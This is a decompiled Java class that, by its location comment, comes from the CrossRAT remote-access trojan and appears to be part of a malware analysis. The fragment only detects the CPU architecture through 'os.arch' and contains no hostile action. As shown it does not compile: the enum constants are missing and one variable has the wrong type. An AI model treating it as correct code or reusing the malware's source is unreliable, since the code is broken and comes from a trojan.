package a;

public enum b
{
  private String[] e;
  
  private b(String... paramVarArgs)
  {
    this.e = paramVarArgs;
  }
  
  public static b a()
  {
    String str = System.getProperty("os.arch");
    b[] arrayOfb;
    int j = (arrayOfb = values()).length;
    for (int i = 0; i < j; i++)
    {
      b localb1;
      b localb2;
      String[] arrayOfString;
      int m = (arrayOfString = (localb2 = localb1 = arrayOfb[i]).e).length;
      for (int k = 0; k < m; k++)
      {
        localb2 = arrayOfString[k];
        if (str.equalsIgnoreCase(localb2)) {
          return localb1;
        }
      }
    }
    return d;
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\a\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */